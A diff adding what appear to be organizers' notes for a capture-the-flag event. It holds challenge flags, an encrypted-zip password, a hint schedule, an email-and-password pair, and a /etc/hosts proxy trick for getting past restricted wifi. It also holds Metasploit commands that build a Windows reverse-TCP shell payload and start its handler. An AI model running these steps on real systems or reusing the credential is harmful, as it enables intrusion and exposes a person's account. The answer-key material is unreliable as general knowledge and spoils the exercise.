@@ -1,0 +1,71 @@
+consulting-company: THE_ROOT_PA$$WORD1 - 128.238.66.212
+    need to finish
+hacktivist-site: THE_ROOT_PA$$WORD2 - 128.238.66.213
+software-site: THE_ROOT_PA$$WORD3 - 128.238.66.214
+
+tandonmeghan@gmail.com:csaw2015csaw2015
+
+
+Police Profile: flag{and_so_1t_begins}
+Victim's Phone: flag{they_were_to0_young_to_d1e}
+SD Card: flag{sorry_1_dr0ned_out_there}
+Encrypted Video: flag{d3leted_but_not_forgotton}
+Contacts: flag{lol_im_not_a_contact}
+
+Ok, for wifi: find the IP that `ssl.google-analytics.com` resolves to (or www.google.com sometimes also works/resolves to the same IP). Once you have that add an entry into `/etc/hosts`: `{ip}    yes-sir-yes.appspot.com`. Then, just go to https://yes-sir-yes.appspot.com and use that proxy.
+
+
+use payload/windows/shell/reverse_tcp
+set LHOST 8.8.8.8
+set LPORT 9001
+generate -b "\x00"
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 9001
+exploit
+
+
+<div class="row">
+  <h1>MCPS HSF</h1>
+    <h3 class="text-center">
+      Welcome to MCPS HSF! To get started, register <a href="/register">here</a>.
+
+      The flag format is a series of characters, numbers and symbols surrounded by brackets. An example flag might look like <b>{this_1$_4_flaG}</b>
+    </h3>
+</div>
+
+
+Run through making evidence
+Register on site
+Stress multiple paths
+Updates page on site
+explain story
+flag format
+writeups
+    Start 30min from the end (12:30)
+
+
+Social Challenge: look for something that starts with {TeamChallenge_...
+
+
+Airplane challenge: Collect air planes
+
+cat 527396.pc 173976.pc 094956.pc 081228.pc 682754.pc 134281.pc 230177.pc 701050.pc 516447.pc 575138.pc 162179.pc 680414.pc 108950.pc 992510.pc 745510.pc 348562.pc 188161.pc > solution.jp
+
+encrypted.zip: th3yWer3HisfilesMrKrabsheUsedApa$$word
+
+
+Hints
+-----
+9:00    Cipher for lock / Rot 13
+10:00   Browser History
+11:00   SD Card File Carving - Something was deleted on just hidden
+12:00   On hactivist website -> give away "static"
+12:30   How do you connect to IRC
+
+Physical Challenges
+-----
+10:30   Social Challenge
+11:30   Paper Airplane
+12:30   Foutain
